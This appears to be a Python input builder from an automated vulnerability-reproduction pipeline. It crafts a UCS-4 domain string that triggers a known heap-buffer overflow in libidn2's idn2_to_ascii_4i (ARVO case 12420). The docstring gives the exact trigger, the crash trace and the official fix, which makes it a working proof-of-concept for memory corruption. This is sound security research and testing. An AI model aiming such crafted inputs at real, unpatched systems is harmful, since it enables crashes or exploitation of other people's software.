"""CG-18（arvo:12420 / libidn2）输入构造器：idn2_to_ascii_4i 输出长度未限 63。

**缺陷**：`lib/lookup.c` 的 `idn2_to_ascii_4i()` 在 `rc == IDN2_OK` 时直接
`strcpy (output, output_u8)`，不检查长度；而调用方（fuzz 目标）给的 `output`
只有 64 字节。官方 patch 在 strcpy 前加了
`if (strlen(output_u8) > 63) return IDN2_TOO_BIG_DOMAIN;`。

**触发条件（实测得到，不是猜的）**：
1. fuzz 目标 `libidn2_to_ascii_8z_fuzzer.c` 只有在 `size % 4 == 0` 时才走
   `idn2_to_ascii_4i((uint32_t *)data, size/4, out2, flags)`，
   即输入被当作 **UCS-4 小端** 数组，`out2 = malloc(64)`；
2. 单个 label 超过 63 字符会被 libidn2 自己拒掉（`ascii66` 单标签 66 字符 = 不崩）；
3. **两个 label、总长 65 字符**（如 `"a"*32 + "." + "b"*32`）能过校验，
   输出的 65 字符 + NUL 正好触发 `WRITE of size 66` 写穿 64 字节缓冲。

实测（n132/arvo:12420-vul / -fix，`docker run ... /bin/arvo`）：
- vul：exit=1，`heap-buffer-overflow`，`WRITE of size 66`，
  `#0 __interceptor_strcpy` → `#1 idn2_to_ascii_4i lib/lookup.c:621`
  （与官方 error.txt 的 DEDUP_TOKEN `__interceptor_strcpy--idn2_to_ascii_4i--LLVMFuzzerTestOneInput` 一致）
- fix：exit=0，无 sanitizer 输出。

**边界**：本构造器已写好并有自检，但 verify 阶段没有对应 `format` 分支
（`_candidates` 只认 mng/pdf/fuzz/gas/rar5/text/jnx/dwg…），
所以**流水线目前不会调用它**；要让 pass 落地需要给 verify 加分支，属后续任务。
"""
from __future__ import annotations

import struct

DEFAULT_LEFT = 32
DEFAULT_RIGHT = 32
MAX_TOTAL = 65          # 64 字节缓冲 + NUL -> 65 字符即越界 1 字节（strcpy 写 66）
LABEL_MAX = 63          # 单标签超过它会被 libidn2 拒绝，反而打不到缺陷

FIELDS = {
    "left": "int(1..63), 第一个 label 的字符数（默认 32）",
    "right": "int(1..63), 第二个 label 的字符数（默认 32）",
    "char_left": "str, 左 label 用一个字符重复（默认 'a'）",
    "char_right": "str, 右 label 用一个字符重复（默认 'b'）",
    "labels": "int, label 数量（默认 2；1 个 label 走不到越界）",
}

# 描述口径的缺陷点（源码实测行号）
DECLARED_SINK = {
    "file": "lib/lookup.c",
    "line": 621,
    "symbol": "strcpy",
    "note": "idn2_to_ascii_4i 里 strcpy 到调用方 64 字节缓冲，未校验长度 > 63",
}


class Idn2Result:
    """构造结果（普通类：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "libidn2"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def _one_char(value, fallback: str) -> str:
    s = str(value or fallback)
    return s[0] if s else fallback


def build(fields: dict) -> Idn2Result:
    """拼一个 UCS-4（小端）域名字节串，总长默认 65 字符。"""
    fields = dict(fields or {})
    try:
        left = int(fields.get("left", DEFAULT_LEFT))
        right = int(fields.get("right", DEFAULT_RIGHT))
        labels = int(fields.get("labels", 2))
    except (TypeError, ValueError):
        return Idn2Result(False, reason="left/right/labels 必须是整数")
    if not 1 <= labels <= 8:
        return Idn2Result(False, reason=f"labels 越界（1..8）: {labels}")
    for name, val in (("left", left), ("right", right)):
        if not 0 <= val <= LABEL_MAX:
            return Idn2Result(False, reason=f"{name} 越界（0..63）: {val}，单 label 超限会被拒")
    cl = _one_char(fields.get("char_left"), "a")
    cr = _one_char(fields.get("char_right"), "b")

    parts = [cl * left]
    for i in range(labels - 1):
        parts.append((cr if i % 2 == 0 else cl) * right)
    domain = ".".join(parts)
    total = len(domain)
    used = {"left": left, "right": right, "labels": labels,
            "char_left": cl, "char_right": cr, "domain_chars": total}

    if total < MAX_TOTAL:
        # 不拦：短的也能构造，只是打不到缺陷；把事实写进 fields_used 供上游判断
        used["warning"] = f"总长 {total} < {MAX_TOTAL}，输出不会写穿 64 字节缓冲"

    data = b"".join(struct.pack("<I", ord(ch)) for ch in domain)
    if len(data) % 4 != 0:                      # UCS-4 天然 4 的倍数，留个断言式兜底
        return Idn2Result(False, reason="内部错误：UCS-4 长度不是 4 的倍数")
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "libidn2 构造器不识别该字段"}
               for k in fields if k not in known]
    return Idn2Result(True, data, used, dropped, "")


def declared_claim() -> dict:
    """描述口径的缺陷声明（供 verify 记录用；已用真实双端验证过触发形）。"""
    return {
        "claim_id": "cg18-idn2-4i-63",
        "subject": "idn2_to_ascii_4i",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/libidn2.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "libidn2"},
        "note": "vul exit=1 (WRITE of size 66) / fix exit=0；verify 尚无 libidn2 分支，未接入",
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":                      # 自检：不需要测试框架
    r = build({})
    assert r.ok, r.reason
    assert r.size == 65 * 4, r.size
    assert r.fields_used["domain_chars"] == 65
    assert build({"left": 63, "right": 1}).ok
    assert not build({"left": 64}).ok
    assert not build({"labels": 99}).ok
    assert not build({"left": "x"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["sink"]["line"] == 621 and c["subject"] == "idn2_to_ascii_4i"
    print("libidn2 builder self-check OK:", r.to_record())
